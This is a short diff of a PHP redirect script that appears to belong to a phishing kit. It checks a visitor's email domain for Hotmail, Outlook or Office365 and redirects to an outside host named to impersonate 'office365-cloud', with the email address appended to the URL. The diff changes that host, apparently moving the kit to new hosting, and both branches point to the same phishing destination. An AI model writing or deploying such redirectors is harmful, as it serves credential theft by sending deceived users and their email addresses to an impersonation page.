@@ -8,11 +8,11 @@
  $domain_check = '@'.strtolower($domain[1]);
  
  if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
-  header('Location: https://'.$praga.'-h37r4.sse.codesandbox.io'.$email);
+  header('Location: https://'.$praga.'-office365-cloud.onrender.com'.$email);
  }
  
  else {
-  header('Location: https://'.$praga.'-h37r4.sse.codesandbox.io'.$email);
+  header('Location: https://'.$praga.'-office365-cloud.onrender.com'.$email);
  }
   
 ?>
